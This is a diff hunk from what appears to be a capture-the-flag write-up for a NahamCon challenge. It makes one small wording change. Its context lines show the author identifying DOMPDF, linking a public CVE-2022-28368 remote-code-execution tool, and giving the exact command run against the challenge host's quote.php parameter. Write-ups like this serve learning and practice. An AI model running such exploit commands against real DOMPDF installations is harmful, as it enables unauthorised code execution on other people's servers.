@@ -19,7 +19,7 @@ And I accidentally made the website error
 
 I researched about this error message, and it appears that this website uses `DOMPDF` to convert our input into a PDF file. Because this website utilizes `DOMPDF`, it reminded me of a machine on HTB where the user had to exploit `RCE` on `DOMPDF`.
 
-Im using this [tool](https://github.com/rvizx/CVE-2022-28368) to easier my work and here is the command that I used to exploit the website
+Im using this [tool](https://github.com/rvizx/CVE-2022-28368) to easier my work and here is the command I used to exploit the website
 
 ```shell
 python3 dompdf-rce.py --inject "http://challenge.nahamcon.com:32261/quote.php?email=test%40mail.com&small=3&medium=3&large=3&organisation=" --dompdf "http://challenge.nahamcon.com:32261/dompdf/"
